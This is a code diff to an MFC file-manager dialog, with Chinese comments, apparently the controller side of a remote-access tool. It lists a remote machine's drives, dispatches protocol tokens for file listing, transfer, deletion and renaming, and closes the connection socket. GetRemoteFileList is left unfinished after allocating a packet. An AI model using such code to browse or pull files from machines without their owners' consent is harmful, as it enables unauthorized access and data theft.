@@ -102,6 +102,7 @@ BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
 	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, &CFileManagerDlg::OnBegindragListRemote)
 	ON_WM_MOUSEMOVE()
 	ON_WM_LBUTTONUP()
+	ON_WM_CLOSE()
 END_MESSAGE_MAP()
 
 
@@ -630,4 +631,182 @@ void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
 		}
 	}
 	CDialogEx::OnLButtonUp(nFlags, point);
+}
+
+void CFileManagerDlg::FixedRmoteDriveList()
+{
+	HIMAGELIST hImageListLarge = NULL;
+	HIMAGELIST hImageListSmall = NULL;
+	BOOL ret = Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
+	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
+	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);
+
+	m_list_remote.DeleteAllItems();
+	while(m_list_remote.DeleteColumn(0));
+
+	m_list_remote.InsertColumn(0, "名称", LVCFMT_LEFT, 200);
+	m_list_remote.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
+	m_list_remote.InsertColumn(2, "总大小", LVCFMT_LEFT, 100);
+	m_list_remote.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);
+
+	char *pDrive = NULL;
+	pDrive = (char *)m_bRemoteDriveList;
+
+	unsigned long TotalMB = 0;	//总大小
+	unsigned long FreeMB  = 0;	//剩余空间
+	char		  FileSystem[MAX_PATH];
+
+	int nIconIndex = -1;
+
+	for (int i = 0; pDrive[i] != '\0'; )
+	{
+		if (pDrive[i] == 'A' || pDrive[i] == 'B')
+		{
+			nIconIndex = 6;
+		}
+		else
+		{
+			switch(pDrive[i + 1])
+			{
+			case DRIVE_REMOVABLE:
+				nIconIndex = 7;
+				break;
+			case DRIVE_FIXED:
+				nIconIndex = 8;
+				break;
+			case DRIVE_REMOTE:
+				nIconIndex = 9;
+				break;
+			case DRIVE_CDROM:
+				nIconIndex = 11;
+				break;
+			default:
+				nIconIndex = 8;
+				break;	
+			}
+		}
+
+		//磁盘名称
+		CString str;
+		str.Format("%c:\\", pDrive[i]);
+		int nItem = m_list_remote.InsertItem(i, str, nIconIndex);
+		m_list_remote.SetItemState(nItem, 1);
+
+		//显示磁盘大小
+		memcpy(&TotalMB, pDrive + i + 2, 4);
+		memcpy(&FreeMB,  pDrive + i + 6, 4);
+		str.Format("%10.1f GB", (float)TotalMB / 1024);
+		m_list_remote.SetItemText(nItem, 2, str);
+		str.Format("%10.1f GB", (float)FreeMB / 1024);
+		m_list_remote.SetItemText(nItem, 3, str);
+
+		i += 10;
+
+		char *lpFileSystemName = NULL;
+		char	*lpTypeName = NULL;
+
+		lpTypeName = pDrive + i;
+		i += lstrlen(pDrive + i) + 1;
+		lpFileSystemName = pDrive + i;
+
+		char *szName = NULL;
+		//磁盘类型为空就显示磁盘名称
+		szName = (lstrlen(lpFileSystemName) == 0) ? lpTypeName : lpFileSystemName;
+		m_list_remote.SetItemText(nItem, 1, szName);
+
+		i += lstrlen(pDrive + i) + 1;
+	}
+
+	m_Remote_Path = "";
+	m_Remote_Directory_ComboBox.ResetContent();
+}
+
+void CFileManagerDlg::OnClose()
+{
+	// TODO: 在此添加消息处理程序代码和/或调用默认值
+	CoUninitialize();
+	m_pContext->m_Dialog[0] = 0;
+	closesocket(m_pContext->m_Socket);
+
+	CDialogEx::OnClose();
+}
+
+void CFileManagerDlg::OnRecviveComplete()
+{
+	switch(m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
+	{
+	case TOKEN_FILE_LIST:	//文件列表
+		FixedRemoteFileList(m_pContext->m_DeCompressionBuffer.GetBuffer(0),
+							m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
+		break;
+	case TOKEN_FILE_SIZE:	// 传输文件时的第一个数据包，文件大小，及文件名
+		CreateLocalRecvFile();
+		break;
+	case TOKEN_FILE_DATA:	//文件内容
+		WriteLocalRecvFile();
+		break;
+	case TOKEN_TRANSFER_FINISH:		//传输完成
+		EndLocalRecvFile();
+		break;
+	case TOKEN_CREATEFOLDER_FINISH:
+		GetRemoteFileList(".");
+		break;
+	case TOKEN_DELETE_FINISH:
+		EndRemoteDeleteFile();
+		break;
+	case TOKEN_GET_TRANSFER_MODE:
+		SendTransferMode();
+		break;
+	case TOKEN_DATA_CONTINUE:
+		SendFileData();
+		break;
+	case TOKEN_RENAME_FINISH:
+		GetRemoteFileList(".");
+		break;
+	default:
+		SendException();
+		break;
+	}
+}
+
+void CFileManagerDlg::GetRemoteFileList(CString directory /* = "" */)
+{
+	if (directory.GetLength() == 0)
+	{
+		int nItem = m_list_remote.GetSelectionMark();
+
+		//如果有选中的，且是目录
+		if (nItem != -1)
+		{
+			if(m_list_remote.GetItemData(nItem) == 1)
+				directory = m_list_remote.GetItemText(nItem, 0);
+		} 
+		else
+		{
+			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
+		}
+	}
+
+	//得到父目录
+	if (directory == "..")
+	{
+		m_Remote_Path = GetParentDirectory(m_Remote_Path);
+	}
+	else if (directory != ".")
+	{
+		m_Remote_Path += directory;
+		if(m_Remote_Path.Right(1) != "\\")
+			m_Remote_Path += "\\";
+	}
+
+	//if磁盘根目录，返回磁盘列表
+	if (m_Remote_Path.GetLength() == 0)
+	{
+		FixedRmoteDriveList();
+		return ;
+	}
+
+	int nPacketSize = m_Remote_Path.GetLength() + 2;
+	BYTE *bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
+
 }
